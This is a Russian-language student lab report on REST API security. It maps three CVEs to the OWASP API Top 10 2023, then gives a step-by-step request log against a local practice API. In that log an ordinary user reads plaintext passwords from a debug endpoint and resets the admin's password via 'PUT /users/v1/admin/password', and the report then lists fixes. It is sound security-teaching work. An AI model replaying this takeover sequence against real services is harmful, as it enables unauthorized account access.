## Часть 1. CVE

Для этой части я смотрел CVE в NVD. Брал такие, где в описании прямо есть REST API или API endpoint. Сравнивал это с OWASP API Security Top 10 2023.

Список OWASP API Top 10 я брал отсюда:
[https://owasp.org/API-Security/editions/2023/en/0x11-t10/](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)

### 1. CVE-2025-67259 - ClassroomIO

Источник:
[https://nvd.nist.gov/vuln/detail/CVE-2025-67259](https://nvd.nist.gov/vuln/detail/CVE-2025-67259)

Дата публикации NVD: 24.04.2026.

В этой CVE проблема была в ClassroomIO v0.1.13. Там обычный студент мог получить лишнюю информацию о курсе через REST endpoint `/rest/v1/course`.

Смысл такой — пользователь вроде бы залогинен, но он не должен видеть данные других студентов и внутреннюю инфу курса. А приложение все равно отдает эти данные, если поменять запрос. В описании написано что можно изменить POST на GET и получить данные через PostgREST endpoint.

Почему это плохо:
сервер проверил что пользователь есть, но не проверил что он может читать именно эти данные. То есть авторизация есть как бы не до конца.

К какому пункту OWASP относится:

`API1:2023 - Broken Object Level Authorization`. Потому что пользователь получает доступ к объектам, которые ему не положены.

Еще можно отнести к `API3:2023 - Broken Object Property Level Authorization`, потому что отдаются лишние поля и данные других людей.

### 2. CVE-2025-64066 - Primakon Pi Portal

Источник:
[https://nvd.nist.gov/vuln/detail/CVE-2025-64066](https://nvd.nist.gov/vuln/detail/CVE-2025-64066)

Дата публикации NVD: 25.11.2025.

Тут проблема в Primakon Pi Portal 1.0.18. Endpoint REST `/api/v2/user/register` был открыт без нормальной авторизации. Из за этого можно было отправлять POST запрос и создавать пользователей в локальной базе.

В нормальной ситуации пользователь должен создаваться через Identity Provider или админом. А тут получается что функция для создания пользователя торчит наружу. Это не правильно, потому что любой может дернуть API.

Причина:
на endpoint не поставили проверку прав. Или поставили не туда. В итоге внутренний или админский функционал стал доступен снаружи.

OWASP:

`API5:2023 - Broken Function Level Authorization`. Потому что обычный человек получает доступ к функции, которая должна быть только для админов или внутренней системы.

`API9:2023 - Improper Inventory Management`. Потому что endpoint как будто служебный, но он остался доступен как обычный публичный API.

### 3. CVE-2025-10611 - WSO2

Источник:
[https://nvd.nist.gov/vuln/detail/CVE-2025-10611](https://nvd.nist.gov/vuln/detail/CVE-2025-10611)

Дата публикации NVD: 16.10.2025.

Эта CVE относится к нескольким продуктам WSO2. В описании сказано что из за плохой реализации access control можно было обходить authentication и authorization checks для некоторых REST API.

Если проще — некоторые REST API можно было вызвать без нормальной проверки, кто ты и можно ли тебе это делать. Из за этого атакующий мог выполнять административные операции.

Причина:
не все маршруты API нормально проходили через проверку безопасности. Где то проверка была слабая, где то ее можно было обойти.

OWASP:

`API2:2023 - Broken Authentication`, потому что можно вызвать API без нормальной проверки пользователя.

`API5:2023 - Broken Function Level Authorization`, потому что административные функции доступны без нужных прав.

`API8:2023 - Security Misconfiguration`, потому что похоже что часть маршрутов была не правильно подключена к security middleware или правилам доступа.

### Вывод по первой части

Во всех трех примерах проблема примерно похожая. API вроде бы есть, endpoint есть, но сервер плохо проверяет кто и что может делать. В REST API это особенно опасно, потому что endpoint можно вызвать напрямую через curl или Postman, и не важно что в интерфейсе такой кнопки нет.

## Часть 2

На главной странице приложение показало список endpoint. Там были:

- `/users/v1`
- `/users/v1/_debug`
- `/users/v1/register`
- `/users/v1/login`
- `/users/v1/{username}`
- `/users/v1/{username}/email`
- `/users/v1/{username}/password`
- `/books/v1`
- `/books/v1/{book}`

Я сразу подумал что надо смотреть users, потому что там есть логин, пароль и изменение пароля. Для REST API это нормальная идея — искать не страницу, а endpoint.

## Ход проверки

### 1. Сначала я открыл

`GET http://localhost:8080/users/v1`

Ответ:

```json
{
  "users": [
    {"email": "mail1@mail.com", "username": "name1"},
    {"email": "mail2@mail.com", "username": "name2"},
    {"email": "admin@mail.com", "username": "admin"}
  ]
}
```

Тут видно список пользователей. Теперь я знаю имена пользователей `name1`, `name2` и `admin`.

### 2. Потом я попробовал debug endpoint

`GET http://localhost:8080/users/v1/_debug`

Ответ был еще лучше :)

```json
{
  "users": [
    {"admin": false, "email": "mail1@mail.com", "password": "pass1", "username": "name1"},
    {"admin": false, "email": "mail2@mail.com", "password": "pass2", "username": "name2"},
    {"admin": true, "email": "admin@mail.com", "password": "pass1", "username": "admin"}
  ]
}
```

Тут уже видно пароли

### 3. Логин под name1

`POST http://localhost:8080/users/v1/login`

Тело:

```json
{"username": "name1", "password": "pass1"}
```

Ответ:

```json
{
  "auth_token": "<токен пользователя name1>",
  "message": "Successfully logged in.",
  "status": "success"
}
```

То есть я получил токен обычного пользователя

### 4. Проверил удаление без токена

`DELETE http://localhost:8080/users/v1/name2`

Ответ:

```json
{ "status": "fail", "message": "Invalid token" }
```

без токена опасные действия не работают. Значит авторизация какая то есть...

### 5. Проверил удаление с токеном обычного пользователя

`DELETE http://localhost:8080/users/v1/name2`

С токеном пользователя `name1`

Ответ:

```json
{ "status": "fail", "message": "Only Admins may delete users!" }
```

видно что удалять пользователей может только админ. Тобишь роли приложение в каком то месте проверяет

### 6. Потом я проверил изменение пароля другого пользователя

`PUT http://localhost:8080/users/v1/admin/password`

С токеном пользователя `name1`.

Тело запроса:

```json
{"password": "newpass"}
```

Ответ:

```text
204 NO CONTENT
```

вот тут уже странно пользователь `name1` не должен менять пароль `admin`. Но сервер вернул 204, как будто все нормально. Надо проверить поменялся ли пароль на самом деле.

### 7. Проверка старого пароля admin

`POST http://localhost:8080/users/v1/login`

Тело:

```json
{"username": "admin", "password": "pass1"}
```

Ответ:

```json
{ "status": "fail", "message": "Password is not correct for the given username." }
```

Получается что  старый пароль уже не подходит. Значит запрос реально поменял пароль

### 8. Проверка нового пароля admin

`POST http://localhost:8080/users/v1/login`

Тело:

```json
{"username": "admin", "password": "newpass"}
```

Ответ:

```json
{
  "auth_token": "<токен администратора>",
  "message": "Successfully logged in.",
  "status": "success"
}
```

Вывод: атака получилась. Обычный пользователь `name1` смог изменить пароль `admin` и потом войти под `admin`.

После теста я еще раз сходил на `/createdb`, чтобы вернуть базу назад. После этого `admin/pass1` опять работал.

## Описание найденной уязвимости

Уязвимость находится в endpoint:

`PUT /users/v1/{username}/password`

Проблема в том, что API проверяет токен, но не проверяет что пользователь из токена совпадает с username в URL. Получается что если у меня есть токен `name1`, я могу в URL написать `admin` и поменять ему пароль.

Это называется Broken Object Level Authorization, потому что объект выбирается через username, а право на этот объект не проверяется.

Проще говоря — сервер верит параметру в ссылке. А так делать нельзя.

## Тип уязвимости

Основной тип:

`API1:2023 - Broken Object Level Authorization`

Потому что обычный пользователь меняет объект другого пользователя.

Еще рядом есть:

`API5:2023 - Broken Function Level Authorization`. Потому что менять чужой пароль это чувствительная функция, а обычный пользователь не должен ее выполнять.

`API3:2023 - Broken Object Property Level Authorization`. Потому что `/users/v1/_debug` показывает password и admin.

`API9:2023 - Improper Inventory Management`. Потому что debug endpoint вообще не должен торчать наружу.

## Меры предотвращения

1. На `PUT /users/v1/{username}/password` надо проверять, что пользователь меняет свой пароль. Если `name1` пытается поменять `admin`, сервер должен вернуть `403 Forbidden`.
2. Админ может менять чужие пароли только если это реально нужно по логике приложения. И это тоже надо логировать.
3. Debug endpoint `/users/v1/_debug` надо убрать или закрыть. В проде его вообще не должно быть.
4. Пароли нельзя хранить в открытом виде. Надо хранить хэши, например bcrypt или Argon2.
5. Нужны тесты:

- `name1` не может менять пароль `admin`;
- `name1` не может менять пароль `name2`;
- без токена сервер отдает `401`;
- с токеном, но без прав сервер отдает `403`.

1. Все такие проверки лучше делать не в каждом endpoint руками, а в одном общем middleware или policy layer. Иначе легко забыть проверку в одном месте.
